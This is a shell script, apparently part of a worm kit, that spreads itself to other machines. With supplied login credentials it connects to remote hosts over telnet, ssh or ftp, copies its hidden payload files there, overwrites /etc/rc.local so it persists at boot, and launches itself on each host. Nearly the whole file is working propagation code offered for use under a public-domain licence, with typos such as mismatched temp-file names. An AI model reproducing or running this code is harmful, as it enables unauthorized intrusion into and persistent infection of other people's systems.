#!/bin/sh

#/*
 #* .wormys.sh
 #*
 #* This is free and unencumbered software released into the public domain.
 #*
 #* Anyone is free to copy, modify, publish, use, compile, sell, or distribute this software, either in source code form or as a compiled binary, for any purpose, commercial or non-commercial, and by any means.
 #*
 #* In jurisdictions that recognize copyright laws, the author or authors of this software dedicate any and all copyright interest in the software to the public domain. We make this dedication for the benefit of the public at large and to the detriment of our heirs and successors. We intend this dedication to be an overt act of relinquishment in perpetuity of all present and future rights to this software under copyright law.
 #* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 #* For more information, please refer to http://unlicense.org
 #* 
 #* 
 #*/

# It wont check if its already infected...that will be so discret when the cpu and ram usage go up...

execST()
{
	~/.wormye -w -i out.fifo -o in.fifo ogin '$2\n'
	~/.wormye -w -i out.fifo -o in.fifo assword '$3\n'
	~/.wormye -w -i out.fifo -o in.fifo "$" 'exit\n'
	~/.wormye -s -o in.fifo '~/.wormy.sh\n' # n or r?
}

telnetF()
{
	~/.wormye -f -i in.fifo -o out.fifo -p .wormye.pid telnet "$4"
	~/.wormye -w -i out.fifo -o in.fifo ogin '$2\n'
	~/.wormye -w -i out.fifo -o in.fifo assword '$3\n'
	cp ~/.wormy.sh ~/.womryt
	~/.wormye -s -o in.fifo 'echo "'
	~/.wormye -s -i ~/.wormyt -o in.fifo
	~/.wormye -s -o in.fifo '" > ~/.wormy.sh\n'
	cp ~/.wormyr ~/.womryt
	~/.wormye -s -o in.fifo 'echo "'
	~/.wormye -s -i ~/.wormyt -o in.fifo
	~/.wormye -s -o in.fifo '" > ~/.wormyr\n'
	cp ~/.wormys.sh ~/.womryt
	~/.wormye -s -o in.fifo 'echo "'
	~/.wormye -s -i ~/.wormyt -o in.fifo
	~/.wormye -s -o in.fifo '" > ~/.wormys.sh\n'
	if [ -e "~/.wormy.pyc" ]; then
		cp ~/.wormy.pyc ~/.womryt
		~/.wormye -s -o in.fifo 'echo "'
		~/.wormye -s -i ~/.wormyt -o in.fifo
		~/.wormye -s -o in.fifo '" > ~/.wormy.pyc\n'
	fi
	cp ~/.wormye ~/.womryt
	~/.wormye -s -o in.fifo 'echo "'
	~/.wormye -s -i ~/.wormyt -o in.fifo
	~/.wormye -s -o in.fifo '" > ~/.wormye\n'
	cp ~/.wormy ~/.womryt
	~/.wormye -s -o in.fifo 'echo "'
	~/.wormye -s -i ~/.wormyt -o in.fifo
	~/.wormye -s -o in.fifo '" > ~/.wormy\n'
	if [ -e "~/.wormyj.class" ]; then
		cp ~/.wormyj.class ~/.womryt
		~/.wormye -s -o in.fifo 'echo "'
		~/.wormye -s -i ~/.wormyt -o in.fifo
		~/.wormye -s -o in.fifo '" > ~/.wormyj.class.sh\n'
	fi
	rm ~/.wormyt
	~/.wormye -f -i in.fifo -o out.fifo -p .wormye.pid telnet "$4"
	execST
}

sshF()
{
	~/.wormye -f -i in.fifo -o out.fifo -p .wormye.pid ssh "$4"
	~/.wormye -w -i out.fifo -o in.fifo ogin '$2\n'
	~/.wormye -w -i out.fifo -o in.fifo assword '$3\n'
	~/.wormye -w -i out.fifo -o in.fifo "$" 'exit\n'
	~/.wormye -f -i in.fifo -o out.fifo -p .wormye.pid scp ".wormy*" "$2@$4:~"
	~/.wormye -w -i out.fifo -o in.fifo assword '$3\n'
	~/.wormye -f -i in.fifo -o out.fifo -p .wormye.pid ssh "$4"
	execST
}

ftpF()
{
	~/.wormye -f -i in.fifo -o out.fifo -p .wormye.pid ftp "$4"
	~/.wormye -w -i out.fifo -o in.fifo Name '$2\n'
	~/.wormye -w -i out.fifo -o in.fifo assword '$3\n'
	~/.wormye -s -o in.fifo 'put ~/.wormye ~/.wormye\n'
	~/.wormye -s -o in.fifo 'put ~/.wormyr /etc/rc.local\n'
	~/.wormye -s -o in.fifo 'chmod +x /etc/rc.local'
	~/.wormye -s -o in.fifo 'put ~/.wormyr ~/.wormyr\n'
	~/.wormye -s -o in.fifo 'put ~/.wormy.sh ~/.wormy.sh\n'
	~/.wormye -s -o in.fifo 'put ~/.wormy ~/.wormy\n'
	if [ -e "~/.wormy.pyc" ]; then
		~/.wormye -s -o in.fifo 'put ~/.wormy.pyc ~/.wormy.pyc\n'
	fi
	if [ -e "~/.wormyj.class" ]; then
		~/.wormye -s -o in.fifo 'put ~/.wormyj.class ~/.wormyj.class\n'
	fi
}

case "$1" in
	telnet)
		telnetF
	;;
	ssh)
		sshF
	;;
	ftp)
		ftpF
	;;
esac
